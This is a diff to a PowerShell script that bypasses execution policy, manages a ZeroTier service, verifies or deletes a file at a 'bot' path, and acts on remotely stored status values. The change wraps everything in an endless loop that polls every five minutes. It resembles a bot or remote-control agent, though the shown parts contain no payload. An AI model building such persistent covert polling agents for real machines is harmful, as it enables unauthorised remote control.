@@ -1,3 +1,4 @@
+while ($true) {
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 $retryAttempts = 5
 $ztservice = "ZeroTierOneService"
@@ -38,8 +39,7 @@ if (Test-Path $botpath) {
         $programHash = $matches[1]
     }
     if ($programHash -eq $existingFileHash) {
-        Write-Host "File is already present and matches the hash. No action needed." | Out-Null
-    } else {
+       } else {
         Remove-Item -Path $botpath -Force
     }
 }
@@ -233,7 +233,7 @@ if ($storedCode -ne $null) {
             # Match found
             if ($status -eq $storedData) {
                 # Status matches, exit
-                exit
+                continue
             } else {        
                 # Perform actions based on status
                 switch ($status) {
@@ -352,3 +352,4 @@ if ($storedCode -ne $null) {
         }
     }
 } else {}
+Start-Sleep 300 }
